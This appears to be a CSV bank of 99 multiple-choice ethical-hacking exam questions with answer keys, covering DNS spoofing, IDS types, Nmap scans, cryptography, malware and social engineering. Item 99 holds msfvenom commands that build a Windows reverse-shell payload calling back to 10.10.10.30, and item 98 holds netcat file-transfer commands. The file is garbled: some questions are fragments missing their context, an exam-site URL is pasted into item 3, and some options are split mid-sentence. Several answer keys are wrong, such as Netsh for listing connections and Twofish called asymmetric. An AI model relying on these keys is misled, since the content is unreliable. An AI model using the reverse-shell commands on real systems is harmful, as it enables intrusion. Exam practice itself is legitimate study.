id,question,A,B,C,D,E,F,G,answer
1,"Let's imagine three companies (A, B and C), all competing in a challenging global environment. Company A and B are working together in developing a product that will generate a major competitive advantage for them. Company A has a secure DNS server while company B has a DNS server vulnerable to spoofing. With a spoofing attack on the DNS server of company B, company C gains access to outgoing e-mails from company B. How do you prevent DNS spoofing?","Install DNS logger and track vulnerable packets","Disable DNS timeouts","Install DNS Anti-spoofing","Disable DNS Zone Transfer","","","","C"
2,"Which Intrusion Detection System is the best applicable for large environments where critical assets on the network need extra scrutiny and is ideal for observing sensitive network segments?","Honeypots","Firewalls","Network-based intrusion detection system (NIDS)","Host-based intrusion detection system (HIDS)","","","","C"
3,"A large company intends to use Blackberry for corporate mobile phones and a security analyst is assigned to evaluate the possible threats. The analyst will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the Prometric Online Testing – Reports https://ibt1.prometric.com/users/custom/report_queue/rq_str... corporate network. What tool should the analyst use to perform a Blackjacking attack?","Paros Proxy","BBProxy","Blooover","BBCrack","","","","B"
4,"What is the minimum number of network connections in a multihomed firewall?","3","5","4","2","","","","A"
5,"Which of the following is a component of a risk assessment?","Administrative safeguards","Physical security","DMZ","Logical interface","","","","A"
6,"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be used to perform session splicing attacks?","tcpsplice","Burp","Hydra","Whisker","","","","D"
7,"Which of the following is not a Bluetooth attack?","Bluedriving","Bluesmacking","Bluejacking","Bluesnarfing","","","","A"
8,"What is the proper response for a NULL scan if the port is closed?","SYN","ACK","FIN","PSH","RST","No response","","E"
9,"You are the Network Admin, and you get a complaint that some of the websites are no longer accessible. You try to ping the servers and find them to be reachable. Then you type the IP address and then you try on the browser, and find it to be accessible. But they are not accessible when you try using the URL. What may be the problem?","Traffic is Blocked on UDP Port 53","Traffic is Blocked on TCP Port 80","Traffic is Blocked on TCP Port 54","Traffic is Blocked on UDP Port 80","","","","A"
10,"If a token and 4-digit personal identification number (PIN) are used to access a computer system and the token performs off-line checking for the correct PIN, what type of attack is possible?","Birthday","Brute force","Man-in-the-middle","Smurf","","","","B"
11,"Peter, a Network Administrator, has come to you looking for advice on a tool that would help him perform SNMP enquires over the network. Which of these tools would do the SNMP enumeration he is looking for? Select the best answers.","SNMPUtil","SNScan","SNMPScan","Solarwinds IP Network Browser","NMap","","","ABD"
12,"What is a ??Collision attack?? in cryptography?","Collision attacks try to get the public key","Collision attacks try to break the hash into three parts to get the plaintext value","Collision attacks try to break the hash into two parts, with the same bytes in each part to get the private key","Collision attacks try to find two inputs producing the same hash","","","","D"
13,"PGP, SSL, and IKE are all examples of which type of cryptography?","Digest","Secret Key","Public Key","Hash Algorithm","","","","C"
14,"MX record priority increases as the number increases. (True/False.)","True","False","","","","","","B"
15,"A company??s policy requires employees to perform file transfers using protocols which encrypt traffic. You suspect some employees are still performing file transfers using unencrypted protocols because the employees do not like changes. You have positioned a network sniffer to capture traffic from the laptops used by employees in the data ingest department. Using Wireshark to examine the captured traffic, which command can be used as display filter to find unencrypted file transfers?","tcp.port = = 21","tcp.port = 23","tcp.port = = 21 | | tcp.port = =22","tcp.port ! = 21","","","","A"
16,"s) What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?","Man-in-the-middle attack","Meet-in-the-middle attack","Replay attack","Traffic analysis attack","","","","B"
17,"Which of the following represents the initial two commands that an IRC client sends to join an IRC network?","USER, NICK","LOGIN, NICK","USER, PASS","LOGIN, USER","","","","A"
18,"The establishment of a TCP connection involves a negotiation called three-way handshake. What type of message does the client send to the server in order to begin this negotiation?","ACK","SYN","RST","SYN-ACK","","","","B"
19,"You just set up a security system in your network. In what kind of system would you find the following string of characters used as a rule within its configuration? alert tcp any any -> 192.168.100.0/24 21 (msg: ????FTP on the network!????;)","A firewall IPTable","FTP Server rule","A Router IPTable","An Intrusion Detection System","","","","D"
20,"Which of the following tools are used for enumeration? (Choose three.)","SolarWinds","USER2SID","Cheops","SID2USER","DumpSec","","","BDE"
21,"s) What is Eve trying to do?","Eve is trying to connect as a user with Administrator privileges","Eve is trying to enumerate all users with Administrative privileges","Eve is trying to carry out a password crack for user Administrator","Eve is trying to escalate privilege of the null user to that of Administrator","","","","C"
22,"You are tasked to perform a penetration test. While you are performing information gathering, you find an employee list in Google. You find the receptionist??s email, and you send her an email changing the source email to her boss??s email (boss@company). In this email, you ask for a pdf with information. She reads your email and sends back a pdf with links. You exchange the pdf links with your malicious links (these links contain malware) and send back the modified pdf, saying that the links don??t work. She reads your email, opens the links, and her machine gets infected. You now have access to the company network. What testing method did you use?","Social engineering","Piggybacking","Tailgating","Eavesdropping","","","","A"
23,"Which of the following statements about a zone transfer is correct? (Choose three.)","A zone transfer is accomplished with the DNS","A zone transfer is accomplished with the nslookup service","A zone transfer passes all zone information that a DNS server maintains","A zone transfer passes all zone information that a nslookup server maintains","A zone transfer can be prevented by blocking all inbound TCP port 53 connections","Zone transfers cannot occur on the Internet","","ACE"
24,"As a securing consultant, what are some of the things you would recommend to a company to ensure DNS security?","Use the same machines for DNS and other applications","Harden DNS servers","Use split-horizon operation for DNS servers","Restrict Zone transfers","Have subnet diversity between DNS servers","","","BCDE"
25,"A hacker is an intelligent individual with excellent computer skills and the ability to explore a computer??s software and hardware without the owner??s permission. Their intention can either be to simply gain knowledge or to illegally make changes. Which of the following class of hacker refers to an individual who works both offensively and defensively at various times?","White Hat","Suicide Hacker","Gray Hat","Black Hat","","","","C"
26,"Which of the following incident handling process phases is responsible for defining rules, collaborating human workforce, creating a back-up plan, and testing the plans for an organization?","Preparation phase","Containment phase","Identification phase","Recovery phase","","","","A"
27,"Which of the following tools is used to detect wireless LANs using the 802.11a/b/g/n WLAN standards on a linux platform?","Kismet","Abel","Netstumbler","Nessus","","","","A"
28,"The configuration allows a wired or wireless network interface controller to pass all traffic it receives to the Central Processing Unit (CPU), rather than passing only the frames that the controller is intended to receive. Which of the following is being described?","Multi-cast mode","Promiscuous mode","WEM","Port forwarding","","","","B"
29,"Which of the following is a low-tech way of gaining unauthorized access to systems?","Social Engineering","Eavesdropping","Scanning","Sniffing","","","","A"
30,"What is correct about digital signatures?","A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party.","Digital signatures may be used in different documents of the same type.","A digital signature cannot be moved from one signed document to another because it is a plain hash of the document content.","Digital signatures are issued once for each user and can be used everywhere until they expire.","","","","A"
31,"What is a NULL scan?","A scan in which all flags are turned off","A scan in which certain flags are off","A scan in which all flags are on","A scan in which the packet size is set to zero","A scan with an illegal packet size","","","A"
32,"A large mobile telephony and data network operator has a data center that houses network elements. These are essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and IPS systems. What is the best security policy concerning this setup?","Network elements must be hardened with user ids and strong password","Regular security tests and audits should be performed.","As long as the physical access to the network elements is restricted, there is no need for additional measures.","There is no need for specific security measures on the network elements as long as firewalls and IPS systems exist.","The operator knows that attacks and down time are inevitable and should have a backup site.","","","A"
33,"Which of the following describes the characteristics of a Boot Sector Virus?","Modifies directory table entries so that directory entries point to the virus code instead of the actual program.","Moves the MBR to another location on the RAM and copies itself to the original location of the MBR.","Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.","Overwrites the original MBR and only executes the new virus code.","","","","C"
34,"The ??Gray-box testing?? methodology enforces what kind of restriction?","Only the external operation of a system is accessible to the tester.","The internal operation of a system in only partly accessible to the tester.","Only the internal operation of a system is known to the tester.","The internal operation of a system is completely known to the tester.","","","","D"
35,"The company ABC recently contracts a new accountant. The accountant will be working with the financial statements. Those financial statements need to be approved by the CFO and then they will be sent to the accountant but the CFO is worried because he wants to be sure that the information sent to the accountant was not modified once he approved it. Which of the following options can be useful to ensure the integrity of the data?","The CFO can use a hash algorithm in the document once he approved the financial statements","The CFO can use an excel file with a password","The financial statements can be sent twice, one by email and the other delivered in USB and the accountant can compare both to be sure is the same document","The document can be sent to the accountant using an exclusive USB for that document","","","","A"
36,"Scenario1: * 1. Victim opens the attacker's web site. * 2. Attacker sets up a web site which contains interesting and attractive content like 'Do you want to make $1000 in a day?'. * 3. Victim clicks to the interesting and attractive content URL. * 4. Attacker creates a transparent 'iframe' in front of the URL which victim attempts to click, so victim thinks that he/she clicks to the 'Do you want to make $1000 in a day?' URL but actually he/she clicks to the content or URL that exists in the transparent 'iframe' which is setup by the attacker. What is the name of the attack which is mentioned in the scenario?","Session Fixation","HTML Injection","HTTP Parameter Pollution","Clickjacking Attack","","","","D"
37,"Which type of security feature stops vehicles from crashing through the doors of a building?","Bollards","Receptionist","Mantrap","Turnstile","","","","A"
38,"When you are getting information about a web server, it is very important to know the HTTP Methods (GET, POST, HEAD, PUT, DELETE, TRACE) that are available because there are two critical methods (PUT and DELETE). PUT can upload a file to the server and DELETE can delete a file from the server. You can detect all these methods (GET, POST, HEAD, DELETE, PUT, TRACE) using NMAP script engine. What Nmap script will help you with this task?","http-methods","http enum","http-headers","http-git","","","","A"
39,"By using a smart card and pin, you are using a two-factor authentication that satisfies","Something you are and something you remember","Something you have and something you know","Something you know and something you are","Something you have and something you are","","","","B"
40,"What did the following commands determine?","That the Joe account has a SID of 500","These commands demonstrate that the guest account has NOT been disabled","These commands demonstrate that the guest account has been disabled","That the true administrator is Joe","Issued alone, these commands prove nothing","","","D"
41,"Null sessions are un-authenticated connections (not using a username or password.) to an NT or 2000 system. Which TCP and UDP ports must you filter to check null sessions on your network?","137 and 139","137 and 443","139 and 443","139 and 445","","","","D"
42,"Which of the following Linux commands will resolve a domain name into IP address?",">host-t a hackeddomain.com",">host-t ns hackeddomain.com",">host -t soa hackeddomain.com",">host -t AXFR hackeddomain.com","","","","A"
43,"What is the role of test automation in security testing?","It is an option but it tends to be very expensive.","It should be used exclusivel","Manual testing is outdated because of low speed and possible test setup inconsistencies.","Test automation is not usable in security due to the complexity of the tests.","It can accelerate benchmark tests and repeat them with a consistent test setu","But it cannot replace manual testing completely.","","D"
44,"An Intrusion Detection System (IDS) has alerted the network administrator to a possibly malicious sequence of packets sent to a Web server in the network??s external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. What type of network tool can be used to determine if these packets are genuinely malicious or simply a false positive?","Protocol analyzer","Network sniffer","Intrusion Prevention System (IPS)","Vulnerability scanner","","","","A"
45,"You are a penetration tester working to test the user awareness of the employees of the client xyz. You harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to the employees via email. Which stage of the cyber kill chain are you at?","Reconnaissance","Command and control","Weaponization","Exploitation","","","","C"
46,"Jim, a professional hacker, targeted an organization that is operating critical Industrial Infrastructure. Jim used Nmap to scan open pons and running services on systems connected to the organization's OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered Information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?","nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >","nmap -Pn -sU -p 44818 --script enip-info < Target IP >","nmap -Pn -sT -p 46824 < Target IP >","nmap -Pn -sT -p 102 --script s7-info < Target IP >","","","","B"
47,"Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve's profile picture and the description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days. Sieve started asking about her company details and eventually gathered all the essential information regarding her company. What is the social engineering technique Steve employed in the above scenario?","Diversion theft","Baiting","Honey trap","Piggybacking","","","","C"
48,"How is the public key distributed in an orderly, controlled fashion so that the users can be sure of the sender??s identity?","Hash value","Private key","Digital signature","Digital certificate","","","","D"
49,"Nedved is an IT Security Manager of a bank in his country. One day. he found out that there is a security breach to his company's email server based on analysis of a suspicious connection from the email server to an unknown IP Address. What is the first thing that Nedved needs to do before contacting the incident response team?","Leave it as it Is and contact the incident response te3m right away","Block the connection to the suspicious IP Address from the firewall","Disconnect the email server from the network","Migrate the connection to the backup email server","","","","C"
50,"s) which of the following protocols can be used to secure an LDAP service against anonymous queries?","SSO","RADIUS","WPA","NTLM","","","","D"
51,"Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session 10 to the target employee. The session ID links the target employee to Boneys account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boneys account. What is the attack performed by Boney in the above scenario?","Session donation attack","Session fixation attack","Forbidden attack","CRIME attack","","","","A"
52,"Vlady works in a fishing company where the majority of the employees have very little understanding of IT let alone IT Security. Several information security issues that Vlady often found includes, employees sharing password, writing his/her password on a post it note and stick it to his/her desk, leaving the computer unlocked, didn??t log out from emails or other social media accounts, and etc. After discussing with his boss, Vlady decided to make some changes to improve the security environment in his company. The first thing that Vlady wanted to do is to make the employees understand the importance of keeping confidential information, such as password, a secret and they should not share it with other persons. Which of the following steps should be the first thing that Vlady should do to make the employees in his company understand to importance of keeping confidential information a secret?","Warning to those who write password on a post it note and put it on his/her desk","Developing a strict information security policy","Information security awareness training","Conducting a one to one discussion with the other employees about the importance of information security","","","","A"
53,"What is one of the advantages of using both symmetric and asymmetric cryptography in SSL/TLS?","Symmetric algorithms such as AES provide a failsafe when asymmetric methods fail.","Asymmetric cryptography is computationally expensive in compariso","However, it is well-suited to securely negotiate keys for use with symmetric cryptography.","Symmetric encryption allows the server to securely transmit the session keys out-of- band.","Supporting both types of algorithms allows less-powerful devices such as mobile phones to use symmetric encryption instead.","","","D"
54,"Ethical hacker jane Smith is attempting to perform an SQL injection attach. She wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs. which two SQL Injection types would give her the results she is looking for?","Out of band and boolean-based","Time-based and union-based","union-based and error-based","Time-based and boolean-based","","","","D"
55,"What kind of detection techniques is being used in antivirus softwares that identifies malware by collecting data from multiple protected systems and instead of analyzing files locally it's made on the premiers environment-","VCloud based","Honypot based","Behaviour based","Heuristics based","","","","A"
56,"Bella, a security professional working at an it firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames. and passwords are shared In plaintext, paving the way for hackers 10 perform successful session hijacking. To address this situation. Bella Implemented a protocol that sends data using encryption and digital certificates. Which of the following protocols Is used by Bella?","FTP","HTTPS","FTPS","IP","","","","C"
57,"is a tool that can hide processes from the process list, can hide files, registry entries, and intercept keystrokes.","Trojan","RootKit","DoS tool","Scanner","Backdoor","","","B"
58,"These hackers have limited or no training and know how to use only basic techniques or tools. What kind of hackers are we talking about?","Black-Hat Hackers A","Script Kiddies","White-Hat Hackers","Gray-Hat Hacker","","","","B"
59,"Sam is working as a system administrator In an organization. He captured the principal characteristics of a vulnerability and produced a numerical score to reflect Its severity using CVSS v3.0 to property assess and prioritize the organization's vulnerability management processes. The base score that Sam obtained after performing cvss rating was 4.0. What is the CVSS severity level of the vulnerability discovered by Sam in the above scenario?","Medium","Low","Critical","High","","","","A"
60,"John is an incident handler at a financial institution. His steps in a recent incident are not up to the standards of the company. John frequently forgets some steps and procedures while handling responses as they are very stressful to perform. Which of the following actions should John take to overcome this problem with the least administrative effort?","Create an incident checklist.","Select someone else to check the procedures.","Increase his technical skills.","Read the incident manual every time it occurs.","","","","C"
61,"What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack against an organization?","The attacker queries a nameserver using the DNS resolver.","The attacker makes a request to the DNS resolver.","The attacker forges a reply from the DNS resolver.","The attacker uses TCP to poison the ONS resofver.","","","","B"
62,"Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary In the above scenario.","use of command-line interface","Data staging","Unspecified proxy activities","Use of DNS tunneling","","","","C"
63,"What type of analysis is performed when an attacker has partial knowledge of inner- workings of the application?","Black-box","Announced","White-box","Grey-box","","","","D"
64,"What would be the fastest way to perform content enumeration on a given web server by using the Gobuster tool?","Performing content enumeration using the bruteforce mode and 10 threads","Shipping SSL certificate verification","Performing content enumeration using a wordlist","Performing content enumeration using the bruteforce mode and random file extensions","","","","C"
65,"A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since the file did nothing when executed, he asks you for help because he suspects that he may have installed a trojan on his computer. what tests would you perform to determine whether his computer Is Infected?","Use ExifTool and check for malicious content.","You do not check; rather, you immediately restore a previous snapshot of the operating system.","Upload the file to VirusTotal.","Use netstat and check for outgoing connections to strange IP addresses or domains.","","","","D"
66,"An organization is performing a vulnerability assessment tor mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization's machines to detect which ports are attached to services such as an email server, a web server or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests. What is the type of vulnerability assessment solution that James employed in the above scenario?","Product-based solutions","Tree-based assessment","Service-based solutions","inference-based assessment","","","","D"
67,"Gavin owns a white-hat firm and is performing a website security audit for one of his clients. He begins by running a scan which looks for common misconfigurations and outdated software versions. Which of the following tools is he most likely using?","Nikto","Nmap","Metasploit","Armitage","","","","B"
68,"During the process of encryption and decryption, what keys are shared?","Private keys","User passwords","Public keys","Public and private keys","","","","C"
69,"Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently. Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture Is Abel currently working in?","Tier-1: Developer machines","Tier-4: Orchestrators","Tier-3: Registries","Tier-2: Testing and accreditation systems","","","","D"
70,"Henry Is a cyber security specialist hired by BlackEye - Cyber security solutions. He was tasked with discovering the operating system (OS) of a host. He used the Unkornscan tool to discover the OS of the target system. As a result, he obtained a TTL value, which Indicates that the target system is running a Windows OS. Identify the TTL value Henry obtained, which indicates that the target OS is Windows.","64","128","255","138","","","","B"
71,"When a security analyst prepares for the formal security assessment - what of the following should be done in order to determine inconsistencies in the secure assets database and verify that system is compliant to the minimum security baseline?","Data items and vulnerability scanning","Interviewing employees and network engineers","Reviewing the firewalls configuration","Source code review","","","","A"
72,"which type of virus can change its own code and then cipher itself multiple times as it replicates?","Stealth virus","Tunneling virus","Cavity virus","Encryption virus","","","","A"
73,"Which of the following statements is FALSE with respect to Intrusion Detection Systems?","Intrusion Detection Systems can be configured to distinguish specific content in network packets","Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic","Intrusion Detection Systems require constant update of the signature library","Intrusion Detection Systems can examine the contents of the data n context of the network protocol","","","","B"
74,"Which of the following DoS tools is used to attack target web applications by starvation of available sessions on the web server? The tool keeps sessions at halt using never-ending POST transmissions and sending an arbitrarily large content-length header value.","My Doom","Astacheldraht","R-U-Dead-Yet?(RUDY)","LOIC","","","","C"
75,"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What is the type of vulnerability assessment that Morris performed on the target organization?","internal assessment","Passive assessment","External assessment","Credentialed assessment","","","","B"
76,"Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities In the DNS server software and modified the original IP address of the target website to that of a fake website. What is the technique employed by Steve to gather information for identity theft?","Pretexting","Pharming","Wardriving","Skimming","","","","B"
77,"Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the Integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT. POST. GET. and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application. What is the type of web-service API mentioned in the above scenario?","JSON-RPC","SOAP API","RESTful API","REST API","","","","C"
78,"This form of encryption algorithm is asymmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?","Twofish encryption algorithm","HMAC encryption algorithm","IDEA","Blowfish encryption algorithm","","","","A"
79,"Which command can be used to show the current TCP/IP connections?","Netsh","Netstat","Net use connection","Net use","","","","A"
80,"Tremp is an IT Security Manager, and he is planning to deploy an IDS in his small company. He is looking for an IDS with the following characteristics: - Verifies success or failure of an attack - Monitors system activities Detects attacks that a network-based IDS fails to detect - Near real-time detection and response - Does not require additional hardware - Lower entry cost Which type of IDS is best suited for Tremp's requirements?","Gateway-based IDS","Network-based IDS","Host-based IDS","Open source-based","","","","C"
81,"Which of the following are well known password-cracking programs?","L0phtcrack","NetCat","Jack the Ripper","Netbus","John the Ripper","","","AE"
82,"What is the algorithm used by LM for Windows2000 SAM?","MD4","DES","SHA","SSL","","","","B"
83,"In Trojan terminology, what is a covert channel?","A channel that transfers information within a computer system or network in a way that violates the security policy","A legitimate communication path within a computer system or network for transfer of data","It is a kernel operation that hides boot processes and services to mask detection","It is Reverse tunneling technique that uses HTTPS protocol instead of HTTP protocol to establish connections","","","","A"
84,"Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited places. Realizing this. James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation by using an automated tool, and gathers information to perform other sophisticated attacks. What is the tool employed by James in the above scenario?","ophcrack","Hootsuite","VisualRoute","HULK","","","","B"
85,"s) for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?","Yancey would be considered a Suicide Hacker","Since he does not care about going to jail, he would be considered a Black Hat","Because Yancey works for the company currently; he would be a White Hat","Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing","","","","A"
86,"What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?","CPU","GPU","UEFI","TPM","","","","D"
87,"An attacker redirects the victim to malicious websites by sending them a malicious link by email. The link appears authentic but redirects the victim to a malicious web page, which allows the attacker to steal the victim's data. What type of attack is this?","Phishing","Vlishing","Spoofing","DDoS","","","","A"
88,"Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a Dos attack, and as a result, legitimate employees were unable to access the clients network. Which of the following attacks did Abel perform in the above scenario?","VLAN hopping","DHCP starvation","Rogue DHCP server attack","STP attack","","","","B"
89,"what is the port to block first in case you are suspicious that an loT device has been compromised?","22","443","48101","80","","","","C"
90,"While browsing his Facebook teed, Matt sees a picture one of his friends posted with the caption. ""Learn more about your friends!"", as well as a number of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is legitimate. Matt responds to the questions on the post, a few days later. Mates bank account has been accessed, and the password has been changed. What most likely happened?","Matt inadvertently provided the answers to his security questions when responding to the post.","Matt's bank-account login information was brute forced.","Matt Inadvertently provided his password when responding to the post.","Matt's computer was infected with a keylogger.","","","","A"
91,"Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?","nmap -sn -pp < target ip address >","nmap -sn -PO < target IP address >","nmap -sn -PS < target IP address >","nmap -sn -PA < target IP address >","","","","C"
92,"While testing a web application in development, you notice that the web server does not properly ignore the ??dot dot slash?? (../) character string and instead returns the file listing of a folder structure of the server. What kind of attack is possible in this scenario?","Cross-site scripting","Denial of service","SQL injection","Directory traversal","","","","D"
93,"While examining audit logs, you discover that people are able to telnet into the SMTP server on port 25. You would like to block this, though you do not see any evidence of an attack or other wrong doing. However, you are concerned about affecting the normal functionality of the email server. From the following options choose how best you can achieve this objective?","Block port 25 at the firewall.","Shut off the SMTP service on the server.","Force all connections to use a username and password.","Switch from Windows Exchange to UNIX Sendmail.","None of the above.","","","E"
94,"Password cracking programs reverse the hashing process to recover passwords. (True/False.)","True","False","","","","","","B"
95,"s) or you may contact us at the following address: Media Internet Consultants, Edif. Neptuno, Planta Baja, Ave. Ricardo J. Alfaro, Tumba Muerto, n/a Panama How will you determine if this is Real Anti-Virus or Fake Anti-Virus website?","Look at the website design, if it looks professional then it is a Real Anti-Virus website","Connect to the site using SSL, if you are successful then the website is genuine","Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site","Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware","Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware","","","C"
96,"During the enumeration phase. Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?","Server Message Block (SMB)","Network File System (NFS)","Remote procedure call (RPC)","Telnet","","","","A"
97,"Ethical backer jane Doe is attempting to crack the password of the head of the it department of ABC company. She Is utilizing a rainbow table and notices upon entering a password that extra characters are added to the password after submitting. What countermeasure is the company using to protect against rainbow tables?","Password key hashing","Password salting","Password hashing","Account lockout","","","","B"
98,"An attacker runs netcat tool to transfer a secret file between two hosts. He is worried about information being sniffed on the network. How would the attacker use netcat to encrypt the information before transmitting onto the wire?","Machine A: netcat -l -p -s password 1234 < testfileMachine B: netcat <machine A IP> 1234","Machine A: netcat -l -e magickey -p 1234 < testfileMachine B: netcat <machine A IP> 1234","Machine A: netcat -l -p 1234 < testfile -pw passwordMachine B: netcat <machine A IP> 1234 -pw password","Use cryptcat instead of netcat","","","","D"
99,"what is the correct way of using MSFvenom to generate a reverse TCP shellcode for windows?","msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c","msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c","msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe","msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe","","","","C"
